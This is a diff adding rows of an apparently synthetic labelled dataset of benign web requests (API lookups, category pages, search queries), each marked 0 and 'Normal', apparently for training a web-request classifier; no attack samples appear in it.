+/category/electronics/page/21,0,Normal
+/api/users/3037,0,Normal
+/api/users/998,0,Normal
+email=admin@company.id&message=panduan,0,Normal
+product_id=647,0,Normal
+/category/fashion/page/37,0,Normal
+format=json&api_key=artikel&limit=7472,0,Normal
+format=json&api_key=Jakarta&limit=1432,0,Normal
+id=8310,0,Normal
+page=46,0,Normal
+id=3420,0,Normal
+/api/users/9267,0,Normal
+search=printer,0,Normal
+product_id=6506,0,Normal
+format=json&api_key=index&limit=6512,0,Normal
+/api/users/2090,0,Normal
+action=view&id=6394&type=books,0,Normal
+callback=getData&limit=8699,0,Normal
+email=admin@company.id&message=electronics,0,Normal
+/search?q=printer&category=fashion,0,Normal
+token=Bandung&user=staff01,0,Normal
+token=komputer&user=john_doe,0,Normal
+/api/users/7860,0,Normal
+filter=sports&sort=asc&page=32,0,Normal
+name=Manager2&age=7813,0,Normal
+id=4273,0,Normal
+/api/products/7455?format=json,0,Normal
+/api/products/6714?format=json,0,Normal
+id=8651,0,Normal
+search=profile,0,Normal
+/category/food/page/42,0,Normal
+product_id=722,0,Normal
+name=John Doe&age=7625,0,Normal
+product_id=7603,0,Normal
+action=view&id=7974&type=books,0,Normal
+/api/products/821?format=json,0,Normal
+q=new&lang=id,0,Normal
+name=Jane Smith&age=6822,0,Normal
+/search?q=main&category=fashion,0,Normal
+q=education&lang=id,0,Normal
+/api/users/5192,0,Normal
+format=json&api_key=contact&limit=3774,0,Normal
+id=8381,0,Normal
+id=1833,0,Normal
+/category/fashion/page/8,0,Normal
+name=Siti Rahayu&age=3576,0,Normal
+/api/products/3381?format=json,0,Normal
+search=Medan,0,Normal
+id=9605,0,Normal
+/api/products/2501?format=json,0,Normal
+/api/products/600?format=json,0,Normal
+/api/products/397?format=json,0,Normal
+name=Budi Santoso&age=4964,0,Normal
+filter=books&sort=asc&page=34,0,Normal
+action=view&id=7780&type=food,0,Normal
+callback=getData&limit=1923,0,Normal
+id=8469,0,Normal
+action=view&id=5539&type=fashion,0,Normal
+format=json&api_key=printer&limit=5337,0,Normal
+/category/tools/page/45,0,Normal
+/api/users/4890,0,Normal
+id=4020,0,Normal
+search=keyboard,0,Normal
+callback=getData&limit=9134,0,Normal
+/category/food/page/22,0,Normal
+filter=electronics&sort=asc&page=11,0,Normal
+token=latest&user=admin_user,0,Normal
+/profile?user=user123,0,Normal
+/category/health/page/11,0,Normal
+action=view&id=6348&type=electronics,0,Normal
+format=json&api_key=product&limit=4582,0,Normal
+product_id=8749,0,Normal
+page=37,0,Normal
+filter=electronics&sort=asc&page=41,0,Normal
+lang=id&theme=default&user=john_doe,0,Normal
+format=json&api_key=2023&limit=2321,0,Normal
+product_id=1634,0,Normal
+format=json&api_key=register&limit=6930,0,Normal
+product_id=4323,0,Normal
+token=panduan&user=budi_santoso,0,Normal
+name=Jane Smith&age=1159,0,Normal
+user=budi_santoso,0,Normal
+filter=tools&sort=asc&page=10,0,Normal
+callback=getData&limit=673,0,Normal
+q=fashion&lang=id,0,Normal
+search=berita,0,Normal
+action=view&id=2925&type=books,0,Normal
+action=view&id=1019&type=sports,0,Normal
+token=panduan&user=john_doe,0,Normal
+product_id=4992,0,Normal
+callback=getData&limit=2980,0,Normal
+name=User123&age=5219,0,Normal
+/api/products/765?format=json,0,Normal
+token=popular&user=john_doe,0,Normal
+/api/users/5186,0,Normal
+/api/products/7413?format=json,0,Normal
+token=health&user=john_doe,0,Normal
+name=User123&age=7054,0,Normal
+product_id=7560,0,Normal
+action=view&id=2640&type=books,0,Normal
+format=json&api_key=headphone&limit=5790,0,Normal
+/category/health/page/28,0,Normal
+callback=getData&limit=1839,0,Normal
+name=Jane Smith&age=2271,0,Normal
+callback=getData&limit=7215,0,Normal
+/api/products/4667?format=json,0,Normal
+/search?q=Bandung&category=electronics,0,Normal
+token=register&user=siti_rahayu,0,Normal
+callback=getData&limit=3847,0,Normal
+callback=getData&limit=9440,0,Normal
+format=json&api_key=webcam&limit=5193,0,Normal
+product_id=4180,0,Normal
+/api/users/6466,0,Normal
+email=support@web.co.id&message=monitor,0,Normal
+format=json&api_key=Makassar&limit=4934,0,Normal
+q=komputer&lang=id,0,Normal
+page=21,0,Normal
+filter=electronics&sort=asc&page=16,0,Normal
+search=home,0,Normal
+/category/food/page/15,0,Normal
+/api/users/6350,0,Normal
+product_id=439,0,Normal
+/category/electronics/page/5,0,Normal
+/category/health/page/17,0,Normal
+callback=getData&limit=2274,0,Normal
+/category/health/page/47,0,Normal
+token=product&user=siti_rahayu,0,Normal
+/api/users/1624,0,Normal
+product_id=4625,0,Normal
+filter=tools&sort=asc&page=32,0,Normal
+id=5902,0,Normal
+callback=getData&limit=2497,0,Normal
+filter=food&sort=asc&page=18,0,Normal
+token=scanner&user=budi_santoso,0,Normal
+/api/products/6273?format=json,0,Normal
+/api/users/3260,0,Normal
+q=popular&lang=id,0,Normal
+action=view&id=8865&type=food,0,Normal
+id=2436,0,Normal
+name=User123&age=5209,0,Normal
+/api/products/1589?format=json,0,Normal
+/search?q=main&category=electronics,0,Normal
+action=view&id=6608&type=fashion,0,Normal
+/search?q=scanner&category=electronics,0,Normal
+token=main&user=budi_santoso,0,Normal
+id=9512,0,Normal
+format=json&api_key=main&limit=9650,0,Normal
+/category/fashion/page/18,0,Normal
+product_id=7433,0,Normal
+/search?q=brand&category=tools,0,Normal
+/api/users/7744,0,Normal
+filter=tools&sort=asc&page=25,0,Normal
+/search?q=model&category=sports,0,Normal
+format=json&api_key=category&limit=6968,0,Normal
+/search?q=brand&category=health,0,Normal
+id=646,0,Normal
+product_id=5092,0,Normal
+/api/users/5666,0,Normal
+id=5913,0,Normal
+product_id=693,0,Normal
+/api/products/3121?format=json,0,Normal
+callback=getData&limit=8097,0,Normal
+filter=sports&sort=asc&page=4,0,Normal
+filter=fashion&sort=asc&page=31,0,Normal
+name=Staff01&age=5907,0,Normal
+name=Siti Rahayu&age=6774,0,Normal
+action=view&id=265&type=electronics,0,Normal
+/api/products/3408?format=json,0,Normal
+action=view&id=7318&type=books,0,Normal
+action=view&id=788&type=books,0,Normal
+name=Supervisor&age=1750,0,Normal
+page=20,0,Normal
+/api/users/976,0,Normal
+/category/electronics/page/26,0,Normal
+id=1200,0,Normal
+format=json&api_key=login&limit=5669,0,Normal
+product_id=5737,0,Normal
+id=107,0,Normal
+product_id=5862,0,Normal
+email=info@toko.com&message=login,0,Normal
+token=brand&user=budi_santoso,0,Normal
+name=Budi Santoso&age=551,0,Normal
+filter=food&sort=asc&page=33,0,Normal
+product_id=3116,0,Normal
+/search?q=2023&category=electronics,0,Normal
+action=view&id=9050&type=health,0,Normal
+product_id=8530,0,Normal
+callback=getData&limit=7927,0,Normal
+/api/products/7357?format=json,0,Normal
+token=keyboard&user=user123,0,Normal
+filter=health&sort=asc&page=32,0,Normal
+page=47,0,Normal
+format=json&api_key=health&limit=7779,0,Normal
+format=json&api_key=scanner&limit=5518,0,Normal
+/category/health/page/16,0,Normal
+id=6139,0,Normal
+action=view&id=2633&type=sports,0,Normal
+token=food&user=operator,0,Normal
+name=User123&age=6771,0,Normal
+/api/users/5908,0,Normal
+token=monitor&user=manager2,0,Normal
+/category/sports/page/49,0,Normal
+filter=food&sort=asc&page=42,0,Normal
+action=view&id=5871&type=books,0,Normal
+search=panduan,0,Normal
+/api/products/2070?format=json,0,Normal
+/api/users/3684,0,Normal
+filter=books&sort=asc&page=16,0,Normal
+name=Budi Santoso&age=7349,0,Normal
+/profile?user=supervisor,0,Normal
+email=user@example.com&message=product,0,Normal
+/category/fashion/page/12,0,Normal
+name=John Doe&age=1203,0,Normal
+callback=getData&limit=1330,0,Normal
+product_id=9507,0,Normal
+/api/users/9178,0,Normal
+callback=getData&limit=5075,0,Normal
+/api/products/9068?format=json,0,Normal
+format=json&api_key=login&limit=5637,0,Normal
+/api/products/808?format=json,0,Normal
+id=4052,0,Normal
+id=885,0,Normal
+/api/products/4627?format=json,0,Normal
+callback=getData&limit=7586,0,Normal
+/api/users/267,0,Normal
+/search?q=laporan&category=fashion,0,Normal
+id=133,0,Normal
+callback=getData&limit=528,0,Normal
+callback=getData&limit=9173,0,Normal
+file=2024.pdf,0,Normal
+action=view&id=6140&type=tools,0,Normal
+file=about.pdf,0,Normal
+page=34,0,Normal
+id=2855,0,Normal
+product_id=1060,0,Normal
+token=Makassar&user=jane_smith,0,Normal
+file=login.pdf,0,Normal
+search=2024,0,Normal
+/api/products/1463?format=json,0,Normal
+q=Medan&lang=id,0,Normal
+id=7683,0,Normal
+search=tablet,0,Normal
+callback=getData&limit=9148,0,Normal
+name=Supervisor&age=6748,0,Normal
+lang=id&theme=default&user=budi_santoso,0,Normal
+search=about,0,Normal
+name=Budi Santoso&age=4098,0,Normal
+q=contact&lang=id,0,Normal
+name=Operator&age=8483,0,Normal
+action=view&id=603&type=health,0,Normal
+/category/fashion/page/2,0,Normal
+/search?q=latest&category=fashion,0,Normal
+/search?q=tablet&category=fashion,0,Normal
+search=laporan,0,Normal
+/search?q=printer&category=electronics,0,Normal
+token=berita&user=operator,0,Normal
+format=json&api_key=printer&limit=6450,0,Normal
+/category/food/page/2,0,Normal
+action=view&id=6481&type=health,0,Normal
+file=category.pdf,0,Normal
+filter=sports&sort=asc&page=29,0,Normal
+token=scanner&user=staff01,0,Normal
+search=fashion,0,Normal
+token=2024&user=supervisor,0,Normal
+name=Jane Smith&age=6195,0,Normal
+token=education&user=budi_santoso,0,Normal
+/api/users/1918,0,Normal
+/api/users/6162,0,Normal
+page=13,0,Normal
+name=User123&age=277,0,Normal
+product_id=6293,0,Normal
+action=view&id=8472&type=electronics,0,Normal
+id=2482,0,Normal
+/api/products/97?format=json,0,Normal
+token=panduan&user=siti_rahayu,0,Normal
+format=json&api_key=Bandung&limit=8103,0,Normal
+id=5367,0,Normal
+/search?q=tutorial&category=electronics,0,Normal
+email=admin@company.id&message=index,0,Normal
+action=view&id=7022&type=health,0,Normal
+callback=getData&limit=1671,0,Normal
+format=json&api_key=Medan&limit=8979,0,Normal
